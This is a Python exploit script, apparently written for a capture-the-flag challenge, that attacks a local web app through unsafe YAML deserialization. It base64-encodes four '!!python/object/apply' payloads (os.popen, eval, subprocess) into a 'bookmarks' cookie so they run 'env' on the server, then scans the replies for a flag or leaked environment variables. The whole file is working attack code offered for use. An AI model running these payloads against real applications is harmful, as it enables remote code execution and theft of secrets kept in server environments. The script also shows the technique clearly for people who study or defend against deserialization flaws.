import base64
import requests
import re
import time

target_url = "http://127.0.0.1:5000"

# Multiple payload strategies
payloads = [
    # Strategy 1: Using os.system with output redirection
    {
        "name": "os.popen",
        "yaml": "!!python/object/apply:os.popen\nargs: ['env']\n"
    },
    # Strategy 2: Using eval to execute arbitrary Python
    {
        "name": "eval_subprocess",
        "yaml": "!!python/object/apply:eval\nargs: [\"__import__('subprocess').check_output(['env'])\"]\n"
    },
    # Strategy 3: Direct subprocess with shell
    {
        "name": "subprocess_shell",
        "yaml": "!!python/object/apply:subprocess.check_output\nargs: [['sh', '-c', 'env']]\n"
    },
    # Strategy 4: Using list format
    {
        "name": "subprocess_list",
        "yaml": "!!python/object/apply:subprocess.check_output\nargs:\n  - ['env']\n"
    }
]

print("[*] Testing multiple YAML deserialization payloads\n")

for payload_data in payloads:
    payload_name = payload_data["name"]
    yaml_payload = payload_data["yaml"]
    
    print(f"[*] Payload: {payload_name}")
    print(f"    {yaml_payload.strip()}")
    
    # Encode payload
    encoded = base64.b64encode(yaml_payload.encode()).decode()
    
    cookies = {
        'user': 'aea729d9fd8b4083b533db2c69e8e238',
        'bookmarks': encoded
    }
    
    try:
        response = requests.get(target_url, cookies=cookies, timeout=3)
        
        print(f"    Status: {response.status_code} | Length: {len(response.text)}")
        
        # Check for FLAG
        if 'FLAG{' in response.text:
            flags = re.findall(r'FLAG\{[^}]+\}', response.text)
            print(f"    [!] FLAG FOUND: {flags}")
            print(f"\n[+] Full Response:\n{response.text}\n")
            break
        elif 'PATH=' in response.text or 'HOME=' in response.text:
            print(f"    [+] Env output detected!")
            print(f"\n[+] Full Response:\n{response.text}\n")
            
    except requests.exceptions.Timeout:
        print(f"    [-] Timeout (server may have crashed)")
    except Exception as e:
        print(f"    [-] Error: {e}")
    
    print()
    time.sleep(0.5)

print("[*] Testing complete")

